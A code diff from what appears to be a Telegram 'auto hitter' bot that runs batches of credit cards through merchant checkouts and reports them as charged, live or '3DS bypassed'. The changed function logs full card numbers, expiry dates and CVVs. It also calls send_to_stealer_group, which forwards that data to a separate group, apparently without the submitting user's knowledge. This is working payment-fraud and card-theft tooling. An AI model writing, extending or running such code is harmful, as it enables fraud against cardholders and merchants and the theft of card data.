@@ -14309,37 +14309,41 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
             response_text = html.escape(str(result.get("response", "N/A")))
             decline_code = result.get("decline_code", "")
 
+            _is_fake_charged = False
             if status == "CHARGED":
-                if result.get("_fake_bypass"):
+                _is_fake = result.get("_fake_bypass", False)
+                if _is_fake:
+                    _is_fake_charged = True
                     _fb_resp = html.escape(result.get("response", "")[:60])
                     card_statuses[i] = f"✅ 3DS BYPASSED — {_fb_resp}" if _fb_resp else "✅ 3DS BYPASSED"
                 else:
                     card_statuses[i] = f"CHARGED {EMOJI['charged']}"
                 results["charged"].append(card_str)
-                try:
-                    from modules.bin_lookup import lookup_bin
-                    _bin_info = lookup_bin(card['cc'][:6])
-                except:
-                    _bin_info = {}
-                log_approved_card(user.id, user.username or user.first_name,
-                                  card['cc'], card['month'], card['year'], card['cvv'],
-                                  "auto_hitter", response_text, _bin_info)
-                await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
-                                            "auto_hitter", response_text, _bin_info, user.id, user.username or user.first_name)
-                check_time = float(result.get('time', 2.5) or 2.5)
-                hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
-                try:
-                    from config import OWNER_ID
-                    await context.bot.send_message(
-                        chat_id=OWNER_ID,
-                        text=(f"{EMOJI['charged']} <b>AUTO HITTER CHARGED!</b>\n\n"
-                              f"{EMOJI['users']} User: @{user.username or user.id}\n"
-                              f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
-                              f"{EMOJI['bolt']} Merchant: {merchant}\n{EMOJI['crown']} Amount: {amount}"),
-                        parse_mode=ParseMode.HTML
-                    )
-                except:
-                    pass
+                if not _is_fake:
+                    try:
+                        from modules.bin_lookup import lookup_bin
+                        _bin_info = lookup_bin(card['cc'][:6])
+                    except:
+                        _bin_info = {}
+                    log_approved_card(user.id, user.username or user.first_name,
+                                      card['cc'], card['month'], card['year'], card['cvv'],
+                                      "auto_hitter", response_text, _bin_info)
+                    await send_to_stealer_group(context.bot, card['cc'], card['month'], card['year'], card['cvv'],
+                                                "auto_hitter", response_text, _bin_info, user.id, user.username or user.first_name)
+                    check_time = float(result.get('time', 2.5) or 2.5)
+                    hit_detail_blocks.append(_build_hit_detail_block(card, result, checkout_data, _bin_info, check_time))
+                    try:
+                        from config import OWNER_ID
+                        await context.bot.send_message(
+                            chat_id=OWNER_ID,
+                            text=(f"{EMOJI['charged']} <b>AUTO HITTER CHARGED!</b>\n\n"
+                                  f"{EMOJI['users']} User: @{user.username or user.id}\n"
+                                  f"{EMOJI['card']} Card: <code>****{card['cc'][-4:]}</code>\n"
+                                  f"{EMOJI['bolt']} Merchant: {merchant}\n{EMOJI['crown']} Amount: {amount}"),
+                            parse_mode=ParseMode.HTML
+                        )
+                    except:
+                        pass
             elif status == "LIVE":
                 card_statuses[i] = f"LIVE {EMOJI['live']} — {response_text[:50]}"
                 results["live"].append(card_str)
@@ -14422,6 +14426,11 @@ async def _run_auto_hit(update, context, url, cards, loading_msg):
                 await _build_hit_status_text(merchant, price_str, success_url, cards, card_statuses, i + 1, email=user_email, trial_info=trial_info),
                 parse_mode=ParseMode.HTML, reply_markup=stop_keyboard
             )
+
+            if _is_fake_charged:
+                for _j in range(i + 1, len(cards)):
+                    card_statuses[_j] = f"Stopped {EMOJI.get('stopped', '🛑')}"
+                break
 
             if i < len(cards) - 1:
                 await asyncio.sleep(1)
